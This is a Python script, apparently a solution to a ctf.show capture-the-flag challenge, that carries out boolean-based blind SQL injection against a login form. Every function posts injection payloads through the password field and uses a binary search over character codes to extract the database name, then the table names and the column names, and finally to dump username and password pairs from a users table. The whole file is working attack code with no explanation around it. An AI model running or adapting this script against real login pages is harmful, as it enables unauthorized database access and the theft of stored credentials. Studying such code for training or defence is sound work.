# -*-coding:utf-8-*-
import requests
import time

host ="https://a1925c30-e83a-4af0-afc6-86206b3134fe.challenge.ctf.show/w/login.php"

def getDatabase():
    ans = ''
    for i in range(1, 1000):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            payload = "1'or(ascii(substr((select(database())),%d,1))<%d)#" % (i, mid)
            data = {
                "userName": "admin",
                "passWord": payload
            }
            res = requests.post(host, data=data)
            # 关键修复：空响应 = 条件成立
            if len(res.text) == 0:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
            time.sleep(0.15)
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid - 1)
        print(f"database -> {ans}")

def getTable():
    ans = ''
    for i in range(1, 1000):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            payload = "1'or(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),%d,1))<%d)#" % (i, mid)
            data = {
                "userName": "admin",
                "passWord": payload
            }
            res = requests.post(host, data=data)
            if len(res.text) == 0:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
            time.sleep(0.15)
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid - 1)
        print(f"tables -> {ans}")

def getColumn(table_name="users"):
    ans = ''
    for i in range(1, 1000):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            payload = '1\'or(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)="%s"),%d,1))<%d)#' % (table_name, i, mid)
            data = {
                "userName": "admin",
                "passWord": payload
            }
            res = requests.post(host, data=data)
            if len(res.text) == 0:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
            time.sleep(0.15)
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid - 1)
        print(f"columns -> {ans}")

def dumpTable():
    ans = ''
    for i in range(1, 10000):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            payload = "1'or(ascii(substr((select(group_concat(username,0x3a,password))from(users)),%d,1))<%d)#" % (i, mid)
            data = {
                "userName": "admin",
                "passWord": payload
            }
            res = requests.post(host, data=data)
            if len(res.text) == 0:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
            time.sleep(0.15)
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid - 1)
        print(f"dump result -> {ans}")

if __name__ == "__main__":
    # 按顺序运行
    # getDatabase()
    # getTable()
    # getColumn("users")
    dumpTable()